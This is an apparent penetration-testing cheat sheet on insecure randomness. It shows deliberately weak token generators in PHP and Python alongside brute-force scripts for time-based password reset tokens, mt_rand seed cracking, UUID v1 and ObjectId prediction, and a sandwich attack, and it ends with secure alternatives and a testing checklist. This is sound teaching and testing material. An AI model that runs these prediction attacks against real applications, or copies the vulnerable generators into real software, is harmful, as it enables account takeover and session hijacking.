# Insecure Randomness

## Description
Insecure randomness refers to weaknesses in random number generation used for security-critical purposes like token generation, session IDs, passwords, and cryptographic keys. Predictable random values can lead to authentication bypass, session hijacking, and other attacks.

## Common Weak Random Sources

### Time-Based Seeds
```php
// Weak - time is predictable
srand(time());
$token = rand();

// Weak - microtime is partially predictable
$token = md5(microtime());
```

### Sequential/Predictable Values
```python
# Weak - incrementing counter
token = counter++

# Weak - predictable formula
token = user_id * 1000 + timestamp
```

### Weak PRNGs
```
- PHP: rand(), mt_rand() (predictable after enough samples)
- Python: random module (Mersenne Twister - predictable)
- Java: java.util.Random (linear congruential - predictable)
- JavaScript: Math.random() (implementation-dependent)
```

## Vulnerable Implementations

### PHP mt_rand()
```php
// Vulnerable - mt_rand can be predicted
$token = mt_rand();

// After collecting enough outputs (624 values for full state)
// The internal state can be recovered
```

### PHP uniqid()
```php
// Vulnerable - based on microtime
$token = uniqid();
// Format: [prefix][seconds in hex][microseconds in hex]

// With more_entropy still predictable
$token = uniqid('', true);
// Just adds mt_rand() which is also predictable
```

### Time-Based Tokens
```php
// Vulnerable - predictable if time is known
$token = md5(time() + 123456789 % rand(4000, 55000000));

// Attack: Bruteforce based on known time window
for ($t = $start_time; $t <= $end_time; $t++) {
    for ($r = 4000; $r <= 55000000; $r++) {
        $candidate = md5($t + 123456789 % $r);
        // Test candidate
    }
}
```

### UUID v1 (Time-Based)
```
# UUID v1 format:
# xxxxxxxx-xxxx-1xxx-xxxx-xxxxxxxxxxxx
#                ^--- version indicator

# Contains:
# - Timestamp (100-nanosecond intervals since 1582)
# - Clock sequence
# - Node (usually MAC address)

# Attack: Predict adjacent UUIDs if one is known
```

### MongoDB ObjectId
```
# Format: 507f1f77bcf86cd799439011
# Structure:
# - Timestamp (4 bytes)
# - Machine identifier (3 bytes)
# - Process ID (2 bytes)
# - Counter (3 bytes)

# Predictable if you know when it was generated
```

## Exploitation Techniques

### 1. mt_rand Prediction

```python
# Using php_mt_seed
# https://github.com/openwall/php_mt_seed

# Collect sample outputs
# Run php_mt_seed to find seed
./php_mt_seed <output1> <output2> ...

# Once seed is known, predict future/past values
```

### 2. Time-Based Token Attack

```python
import hashlib
import time

# Password reset token based on time
def predict_token(email, time_window):
    tokens = []
    for t in range(time_window[0], time_window[1]):
        token = hashlib.md5(f"{email}{t}".encode()).hexdigest()
        tokens.append(token)
    return tokens

# Test tokens against reset endpoint
```

### 3. UUID v1 Prediction

```bash
# Using guidtool
# https://github.com/intruder-io/guidtool

# Extract timestamp and node from UUID
guidtool -i "550e8400-e29b-11d4-a716-446655440000"

# Generate adjacent UUIDs
guidtool -g -t "2024-01-01 12:00:00" -n "44:66:55:44:00:00"
```

### 4. MongoDB ObjectId Prediction

```bash
# Using mongo-objectid-predict
# https://github.com/andresriancho/mongo-objectid-predict

# Predict ObjectIds
python mongo-objectid-predict.py --counter-diff 1000 507f1f77bcf86cd799439011
```

### 5. Session ID Analysis

```python
# Collect multiple session IDs
sessions = [
    "abc123def456",
    "abc124def457",
    "abc125def458"
]

# Look for patterns
# - Sequential portions
# - Time-based portions
# - Predictable encoding
```

### 6. Sandwich Attack

```
1. Generate token immediately before victim
2. Victim generates their token
3. Generate token immediately after victim
4. Predict victim's token (it's between yours)
```

## Tools

### reset-tolkien
```bash
# Password reset token analyzer
# https://github.com/YesWeHack/reset-tolkien

# Analyze tokens
python reset-tolkien.py --tokens tokens.txt
```

### php_mt_seed
```bash
# Crack PHP mt_rand seed
# https://github.com/openwall/php_mt_seed

./php_mt_seed 1234567890  # Single known value
./php_mt_seed 1234567890 1234567890 0 2147483647  # With constraints
```

### Burp Sequencer
```
1. Capture token-generating request
2. Send to Sequencer
3. Collect samples (minimum 100, ideally 1000+)
4. Analyze for randomness quality
```

## Vulnerable Scenarios

### Password Reset Tokens
```php
// Vulnerable
$token = md5(time() . $email);

// Attack: If you know email and approximate time
$start = time() - 300; // 5 minutes ago
$end = time();
for ($t = $start; $t <= $end; $t++) {
    $candidate = md5($t . $victim_email);
    // Try password reset with candidate
}
```

### API Keys
```python
# Vulnerable - based on user info
api_key = base64_encode(f"{user_id}:{timestamp}")

# Attack: Decode and modify
```

### Session Tokens
```php
// Vulnerable - sequential
$session_id = $last_session_id + 1;

// Attack: Enumerate sessions
```

### OTP Generation
```php
// Vulnerable - time-based with known algorithm
$otp = substr(md5(time()), 0, 6);

// Attack: Calculate valid OTPs for time window
```

## Testing Methodology

### 1. Collect Samples
```bash
# Collect multiple tokens
for i in {1..100}; do
    curl -s https://target.com/generate-token >> tokens.txt
done
```

### 2. Analyze Patterns
```python
# Look for:
# - Sequential portions
# - Time correlation
# - Repeated patterns
# - Short token space
```

### 3. Statistical Analysis
```bash
# Using Burp Sequencer or custom tools
# Check for:
# - Character-level analysis
# - Bit-level analysis
# - FIPS tests
```

### 4. Predict and Verify
```bash
# Generate predicted tokens
# Test against application
```

## Secure Alternatives

### PHP
```php
// Use random_bytes() or random_int()
$token = bin2hex(random_bytes(32));
$number = random_int(0, PHP_INT_MAX);
```

### Python
```python
import secrets
token = secrets.token_hex(32)
number = secrets.randbelow(2**32)
```

### Java
```java
import java.security.SecureRandom;
SecureRandom random = new SecureRandom();
byte[] token = new byte[32];
random.nextBytes(token);
```

### Node.js
```javascript
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');
```

## Testing Checklist

- [ ] Collect multiple token samples
- [ ] Check for time-based patterns
- [ ] Check for sequential patterns
- [ ] Analyze with Burp Sequencer
- [ ] Test prediction attacks
- [ ] Check token length (should be >= 128 bits)
- [ ] Verify CSPRNG usage in source code

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Randomness
- https://owasp.org/www-community/vulnerabilities/Insecure_Randomness
- https://www.openwall.com/php_mt_seed/
